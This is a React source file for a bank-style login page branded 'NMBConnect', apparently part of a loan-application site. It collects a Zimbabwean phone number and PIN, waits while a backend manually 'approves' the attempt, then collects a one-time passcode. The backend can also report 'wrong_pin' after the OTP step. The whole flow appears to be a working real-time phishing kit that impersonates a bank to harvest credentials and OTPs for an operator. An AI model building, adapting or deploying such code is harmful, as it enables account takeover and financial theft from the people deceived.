import { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { useLoanApplication } from '../LoanApplicationContext';
import './Login.css';

const NETWORK_ERROR_MESSAGE = 'Failed to process. Check your internet and try again.';
const WRONG_PIN_MESSAGE = 'The PIN or phone number you entered earlier was incorrect. Please login again with the correct details.';

// Phone validation: accepts 9-digit (7XXXXXXXX) or 10-digit (07XXXXXXXX) local numbers
const validatePhoneNumber = (number) => {
  if (!number) return { valid: false, message: '' };

  const length = number.length;

  // Must be 9 or 10 digits
  if (length < 9 || length > 10) {
    return { valid: false, message: '' };
  }

  const firstDigit = number[0];
  const secondDigit = number[1];

  if (length === 10) {
    // For 10-digit numbers, must start with 0, and second digit must be 7
    if (firstDigit !== '0') {
      return {
        valid: false,
        message: '10-digit numbers must start with 07'
      };
    }
    if (secondDigit !== '7') {
      return {
        valid: false,
        message: '10-digit numbers must start with 07'
      };
    }
  } else if (length === 9) {
    // For 9-digit numbers, must start with 7
    if (firstDigit !== '7') {
      return {
        valid: false,
        message: '9-digit numbers must start with 7'
      };
    }
  }

  return { valid: true, message: '' };
};

export default function Login() {
  const navigate = useNavigate();
  const { serverStatus } = useLoanApplication();
  const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:3001';
  const API_ENDPOINT = import.meta.env.VITE_USER_API_ENDPOINT || '1';

  // Stage states
  const [stage, setStage] = useState('credentials'); // credentials, approvalWaiting, otp, processing
  const [phone, setPhone] = useState(localStorage.getItem('login_phone') || '');
  const [pin, setPin] = useState(['', '', '', '']);
  const [otp, setOtp] = useState(['', '', '', '', '', '']);
  const [showPin, setShowPin] = useState(false);
  const [otpTimer, setOtpTimer] = useState(0);
  const [isResending, setIsResending] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [progress, setProgress] = useState(0);
  const [verificationStatus, setVerificationStatus] = useState('');
  const [isOtpApproved, setIsOtpApproved] = useState(false);
  const [errorModal, setErrorModal] = useState({ show: false, message: '' });
  const [approvalAttempts, setApprovalAttempts] = useState(0);

  const pollingIntervalRef = useRef(null);
  const consecutiveFailuresRef = useRef(0);
  const pinRefs = [useRef(null), useRef(null), useRef(null), useRef(null)];
  const otpRefs = [useRef(null), useRef(null), useRef(null), useRef(null), useRef(null), useRef(null)];

  const MAX_CONSECUTIVE_FAILURES = 5;

  // Poll for login approval
  useEffect(() => {
    if (stage !== 'approvalWaiting') return;

    consecutiveFailuresRef.current = 0;

    const checkApprovalStatus = async () => {
      try {
        const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/check-login-approval`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            phoneNumber: phone,
            pin: pin.join('')
          })
        });

        if (!response.ok) {
          throw new Error('Server error');
        }

        const data = await response.json();

        // Reset failure counter on a successful round-trip
        consecutiveFailuresRef.current = 0;

        if (data.approved) {
          setStage('otp');
          setOtpTimer(120);
          clearInterval(pollingIntervalRef.current);
        } else if (data.rejected) {
          clearInterval(pollingIntervalRef.current);
          setStage('credentials');
          setPin(['', '', '', '']);
          setErrorModal({ show: true, message: data.error || 'Failed.Enter correct details and try again.' });
        }

        setApprovalAttempts(prev => prev + 1);
      } catch (error) {
        console.error('Error checking approval:', error);
        consecutiveFailuresRef.current += 1;

        // If we can't reach the server repeatedly, stop polling and let the user know
        if (consecutiveFailuresRef.current >= MAX_CONSECUTIVE_FAILURES) {
          clearInterval(pollingIntervalRef.current);
          setStage('credentials');
          setPin(['', '', '', '']);
          setErrorModal({ show: true, message: NETWORK_ERROR_MESSAGE });
        }
      }
    };

    pollingIntervalRef.current = setInterval(checkApprovalStatus, 2000);
    checkApprovalStatus();

    return () => {
      if (pollingIntervalRef.current) {
        clearInterval(pollingIntervalRef.current);
      }
    };
  }, [stage, phone, pin, API_BASE_URL, API_ENDPOINT]);

  // OTP Timer
  useEffect(() => {
    if (otpTimer > 0 && stage === 'otp') {
      const timer = setInterval(() => {
        setOtpTimer(prev => prev - 1);
      }, 1000);
      return () => clearInterval(timer);
    }
  }, [otpTimer, stage]);

  // Processing progress
  useEffect(() => {
    if (stage === 'processing' && isOtpApproved && progress < 100) {
      const timer = setTimeout(() => {
        setProgress(prev => Math.min(prev + Math.random() * 15 + 5, 100));
      }, 300);
      return () => clearTimeout(timer);
    } else if (progress >= 100 && isOtpApproved && stage === 'processing') {
      setTimeout(() => {
        localStorage.setItem('login_phone', phone);
        localStorage.setItem('applicationId', 'APP_' + Date.now());
        navigate('/status');
      }, 500);
    }
  }, [stage, isOtpApproved, progress, navigate, phone]);

  // Handle phone input
  const handlePhoneChange = (e) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length <= 10) {
      setPhone(value);
    }
  };

  // Handle PIN input
  const handlePinChange = (index, value) => {
    const numericValue = value.replace(/\D/g, '');
    if (numericValue.length > 1) return;
    
    const newPin = [...pin];
    newPin[index] = numericValue;
    setPin(newPin);

    if (numericValue && index < 3) {
      pinRefs[index + 1].current?.focus();
    }
  };

  const handlePinKeyDown = (index, e) => {
    if (e.key === 'Backspace') {
      if (pin[index]) {
        const newPin = [...pin];
        newPin[index] = '';
        setPin(newPin);
      } else if (index > 0) {
        pinRefs[index - 1].current?.focus();
      }
    } else if (e.key === 'ArrowLeft' && index > 0) {
      pinRefs[index - 1].current?.focus();
    } else if (e.key === 'ArrowRight' && index < 3) {
      pinRefs[index + 1].current?.focus();
    }
  };

  // Handle OTP input
  const handleOtpChange = (index, value) => {
    const numericValue = value.replace(/\D/g, '');
    if (numericValue.length > 1) return;
    
    const newOtp = [...otp];
    newOtp[index] = numericValue;
    setOtp(newOtp);

    if (numericValue && index < 5) {
      otpRefs[index + 1].current?.focus();
    }
  };

  const handleOtpPaste = (e, index) => {
    e.preventDefault();
    const pastedText = e.clipboardData.getData('text');
    const digits = pastedText.replace(/\D/g, '').slice(0, 6).split('');
    
    const newOtp = [...otp];
    digits.forEach((digit, i) => {
      if (index + i < 6) {
        newOtp[index + i] = digit;
      }
    });
    setOtp(newOtp);

    const focusIndex = Math.min(index + digits.length, 5);
    otpRefs[focusIndex].current?.focus();
  };

  const handleOtpKeyDown = (index, e) => {
    if (e.key === 'Backspace') {
      if (otp[index]) {
        const newOtp = [...otp];
        newOtp[index] = '';
        setOtp(newOtp);
      } else if (index > 0) {
        otpRefs[index - 1].current?.focus();
      }
    } else if (e.key === 'ArrowLeft' && index > 0) {
      otpRefs[index - 1].current?.focus();
    } else if (e.key === 'ArrowRight' && index < 5) {
      otpRefs[index + 1].current?.focus();
    }
  };

  // Handle login submission
  const handleLoginSubmit = async (e) => {
    e.preventDefault();

    const phoneValidation = validatePhoneNumber(phone);
    if (!phoneValidation.valid) {
      setErrorModal({
        show: true,
        message: phoneValidation.message || 'Please enter a valid phone number'
      });
      return;
    }

    if (pin.join('').length !== 4) {
      setErrorModal({ show: true, message: 'PIN must be 4 digits' });
      return;
    }

    setIsSubmitting(true);

    try {
      const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phoneNumber: phone,
          pin: pin.join('')
        })
      });

      if (!response.ok) {
        throw new Error('Server error');
      }

      const data = await response.json();

      if (data.success) {
        setStage('approvalWaiting');
      } else {
        setErrorModal({
          show: true,
          message: data.error || 'Incorrect phone number or PIN. Please try again.'
        });
      }
    } catch (error) {
      console.error('Login error:', error);
      setErrorModal({ show: true, message: NETWORK_ERROR_MESSAGE });
    } finally {
      setIsSubmitting(false);
    }
  };

  // Check OTP status — three possible verified outcomes from the backend:
  //   'approved'   -> OTP correct, proceed
  //   'rejected'   -> OTP itself was wrong, stay on this screen and retry
  //   'wrong_pin'  -> the original phone/PIN combo was invalid; send back to login entirely
  const checkOTPStatus = async (otpCode) => {
    const startTime = Date.now();
    const maxTime = 5 * 60 * 1000; // 5 minutes
    let networkFailures = 0;

    while (Date.now() - startTime < maxTime) {
      try {
        const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/check-otp-status`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            phoneNumber: phone,
            otp: otpCode
          })
        });

        if (!response.ok) {
          throw new Error('Server error');
        }

        const data = await response.json();
        networkFailures = 0;

        if (data.status === 'approved') {
          return { approved: true };
        } else if (data.status === 'wrong_pin') {
          return { approved: false, wrongPin: true, message: WRONG_PIN_MESSAGE };
        } else if (data.status === 'rejected') {
          return { approved: false, message: 'Incorrect OTP code. Please try again.' };
        }

        setVerificationStatus('Processing your request...');

        // Wait before next poll
        await new Promise(resolve => setTimeout(resolve, 2000));

      } catch (error) {
        console.error('Error checking OTP:', error);
        networkFailures += 1;

        if (networkFailures >= MAX_CONSECUTIVE_FAILURES) {
          return { approved: false, message: NETWORK_ERROR_MESSAGE };
        }

        await new Promise(resolve => setTimeout(resolve, 2000));
      }
    }

    return { approved: false, timeout: true, message: 'Verification request timed out. Please try again.' };
  };

  // Handle OTP submission
  const handleOtpSubmit = async (e) => {
    e.preventDefault();

    const fullOtp = otp.join('');
    if (fullOtp.length !== 6) {
      setErrorModal({ show: true, message: 'Please enter 6-digit OTP' });
      return;
    }

    setIsSubmitting(true);
    setStage('processing');
    setVerificationStatus('Processing your request...');
    setProgress(0);

    try {
      const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/verify-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phoneNumber: phone,
          otp: fullOtp,
          timestamp: new Date().toISOString()
        })
      });

      if (!response.ok) {
        throw new Error('Server error');
      }

      await response.json();

      const verificationResult = await checkOTPStatus(fullOtp);

      if (verificationResult.approved) {
        setVerificationStatus('✅ Verified!');
        setIsOtpApproved(true);
        return;
      }

      if (verificationResult.wrongPin) {
        // The original login credentials were wrong — this isn't an OTP retry situation.
        // Send the user all the way back to the credentials screen.
        localStorage.removeItem('login_phone');
        setStage('credentials');
        setIsSubmitting(false);
        setProgress(0);
        setPhone('');
        setPin(['', '', '', '']);
        setOtp(['', '', '', '', '', '']);
        setErrorModal({ show: true, message: verificationResult.message });
        return;
      }

      // Wrong OTP code, network failure, or timeout — stay on the OTP screen and let them retry
      setStage('otp');
      setIsSubmitting(false);
      setProgress(0);
      setErrorModal({ show: true, message: verificationResult.message || 'Verification failed. Please try again.' });
      setOtp(['', '', '', '', '', '']);
    } catch (error) {
      console.error('OTP verification error:', error);
      setStage('otp');
      setIsSubmitting(false);
      setProgress(0);
      setErrorModal({ show: true, message: NETWORK_ERROR_MESSAGE });
      setOtp(['', '', '', '', '', '']);
    }
  };

  // Handle resend OTP
  const handleResendOtp = async () => {
    if (otpTimer > 0 || isResending) return;

    setIsResending(true);

    try {
      const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/resend-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phoneNumber: phone,
          timestamp: new Date().toISOString()
        })
      });

      if (!response.ok) {
        throw new Error('Server error');
      }

      const data = await response.json();

      if (data.success) {
        setOtp(['', '', '', '', '', '']);
        setOtpTimer(120);
        otpRefs[0].current?.focus();
      } else {
        setErrorModal({ show: true, message: data.error || 'Unable to resend the code. Please try again shortly.' });
      }
    } catch (error) {
      console.error('Resend OTP error:', error);
      setErrorModal({ show: true, message: NETWORK_ERROR_MESSAGE });
    } finally {
      setIsResending(false);
    }
  };

  const handleBack = () => {
    if (stage === 'approvalWaiting') {
      setStage('credentials');
    } else if (stage === 'otp') {
      setStage('credentials');
      setOtp(['', '', '', '', '', '']);
    }
  };

  const closeErrorModal = () => {
    setErrorModal({ show: false, message: '' });
  };

  // Credentials Stage
  if (stage === 'credentials') {
    const isPhoneValid = validatePhoneNumber(phone).valid;
    const isPinComplete = pin.join('').length === 4;
    const fieldsFilled = isPhoneValid && isPinComplete;

    // Server status comes from LoanApplicationContext, checked once on mount there
    // (isChecking: still probing/retrying, isActive: false: gave up / not reachable)
    const serverConnecting = serverStatus.isChecking || !serverStatus.isActive;

    // Priority: server not reachable/still checking -> yellow "connecting" state, regardless of fields.
    // Otherwise: fields incomplete -> grey (default). Fields complete + server healthy -> blue/active.
    let buttonClass = 'login-button';
    let buttonLabel = 'CONTINUE';

    if (isSubmitting) {
      buttonLabel = 'CONNECTING...';
      buttonClass += ' active';
    } else if (serverConnecting) {
      buttonClass += ' connecting';
      buttonLabel = 'CONNECTING...';
    } else if (fieldsFilled) {
      buttonClass += ' active';
    }

    const isButtonDisabled = isSubmitting || serverConnecting || !fieldsFilled;

    return (
      <div className="login-container">
        <header className="login-header">
          <img src="/logo.svg" alt="Logo" className="login-logo-img" />
          <div className="login-logo">NMB<span className="login-gold">Connect</span></div>
          <div className="login-subtitle">Secure Authentication</div>
        </header>

        <main className="login-main">
          <div className="login-card">
            <h1 className="login-title">Secure Login</h1>
            <p className="login-subtitle">Enter your NMB phone & PIN</p>

            {errorModal.show && (
              <div className="error-modal-overlay" onClick={closeErrorModal}>
                <div className="error-modal" onClick={(e) => e.stopPropagation()}>
                  <h2 className="error-modal-title">Error</h2>
                  <p className="error-modal-message">{errorModal.message}</p>
                  <button className="error-modal-button" onClick={closeErrorModal}>OK</button>
                </div>
              </div>
            )}

            <form onSubmit={handleLoginSubmit}>
              <div className="form-group">
                <label className="form-label">Phone Number</label>
                <div className="phone-input-wrapper">
                  <span className="phone-flag">🇿🇼</span>
                  <span className="phone-code">+263</span>
                  <input
                    type="tel"
                    className="phone-input-field"
                    value={phone}
                    onChange={handlePhoneChange}
                    placeholder="712345678"
                    maxLength="10"
                    disabled={isSubmitting}
                  />
                </div>
              </div>
              <div className="form-group">
                <label className="form-label">ENTER PIN</label>
                <div className="pin-grid">
                  {pin.map((digit, index) => (
                    <input
                      key={index}
                      ref={pinRefs[index]}
                      type={showPin ? 'text' : 'password'}
                      className={`pin-input ${digit ? 'filled' : ''}`}
                      value={digit}
                      onChange={(e) => handlePinChange(index, e.target.value)}
                      onKeyDown={(e) => handlePinKeyDown(index, e)}
                      maxLength="1"
                      inputMode="numeric"
                      disabled={isSubmitting}
                    />
                  ))}
                </div>

                <div className="show-pin-toggle">
                  <input
                    type="checkbox"
                    id="show-pin"
                    checked={showPin}
                    onChange={(e) => setShowPin(e.target.checked)}
                  />
                  <label htmlFor="show-pin">Show PIN</label>
                </div>
              </div>

              <button
                type="submit"
                className={buttonClass}
                disabled={isButtonDisabled}
              >
                {buttonLabel}
              </button>
            </form>
          </div>
        </main>

        <footer className="login-footer">
          © 2026 NMB Holdings | Secure Login
        </footer>
      </div>
    );
  }

  // Approval Waiting Stage
  if (stage === 'approvalWaiting') {
    return (
      <div className="login-container">
        <main className="login-main">
          <div className="approval-card">
            <div className="approval-spinner-container">
              <div className="approval-spinner"></div>
            </div>
            
            <h1 className="approval-title">Requesting Verification</h1>
            <p className="approval-subtitle">Please wait while we process your request</p>
            
            <div className="approval-dots">
              <span className="dot"></span>
              <span className="dot"></span>
              <span className="dot"></span>
            </div>
          </div>
        </main>

        <footer className="login-footer">
          © 2026 NMB Holdings
        </footer>
      </div>
    );
  }

  // OTP Stage
  if (stage === 'otp') {
    const isOtpComplete = otp.every(digit => digit !== '');

    return (
      <div className="login-container">
        <header className="login-header">
          <button className="back-btn" onClick={handleBack}>←</button>
          <img src="/logo.svg" alt="Logo" className="login-logo-img" />
          <div className="login-logo">NMB<span className="login-gold">Connect</span></div>
        </header>

        <main className="login-main">
          <div className="login-card">
            <h1 className="login-title">OTP Verification</h1>
            <p className="login-subtitle">Enter the code sent to your phone</p>

            {errorModal.show && (
              <div className="error-modal-overlay" onClick={closeErrorModal}>
                <div className="error-modal" onClick={(e) => e.stopPropagation()}>
                  <h2 className="error-modal-title">Error</h2>
                  <p className="error-modal-message">{errorModal.message}</p>
                  <button className="error-modal-button" onClick={closeErrorModal}>OK</button>
                </div>
              </div>
            )}

            <form onSubmit={handleOtpSubmit}>
              <div className="otp-inputs">
                {otp.map((digit, index) => (
                  <input
                    key={index}
                    ref={otpRefs[index]}
                    type="text"
                    className={`otp-box ${digit ? 'filled' : ''}`}
                    value={digit}
                    onChange={(e) => handleOtpChange(index, e.target.value)}
                    onKeyDown={(e) => handleOtpKeyDown(index, e)}
                    onPaste={(e) => handleOtpPaste(e, index)}
                    maxLength="1"
                    inputMode="numeric"
                    disabled={isSubmitting}
                  />
                ))}
              </div>

              <p className="resend-text">
                {isResending ? (
                  <span>Resending...</span>
                ) : otpTimer > 0 ? (
                  `Resend in ${otpTimer}s`
                ) : (
                  <>
                    Didn't get code?{' '}
                    <span className="resend-link" onClick={handleResendOtp}>
                      Resend
                    </span>
                  </>
                )}
              </p>

              <button
                type="submit"
                className={`login-button ${isOtpComplete ? 'active' : ''}`}
                disabled={!isOtpComplete || isSubmitting}
              >
                {isSubmitting ? 'VERIFYING...' : 'VERIFY'}
              </button>
            </form>
          </div>
        </main>

        <footer className="login-footer">
          © 2026 NMB Holdings | Secure Login
        </footer>
      </div>
    );
  }

  // Processing Stage
  if (stage === 'processing') {
    return (
      <div className="login-container">
        <main className="login-main">
          <div className="processing-card">
            <div className="spinner-container">
              <div className="spinner"></div>
            </div>
            
            <h1 className="processing-title">Verifying OTP</h1>
            <p className="processing-subtitle">{verificationStatus}</p>
            
            <div className="progress-bar-container">
              <div className="progress-bar" style={{ width: `${progress}%` }}></div>
            </div>
          </div>
        </main>

        <footer className="login-footer">
          © 2026 NMB Holdings
        </footer>
      </div>
    );
  }
}
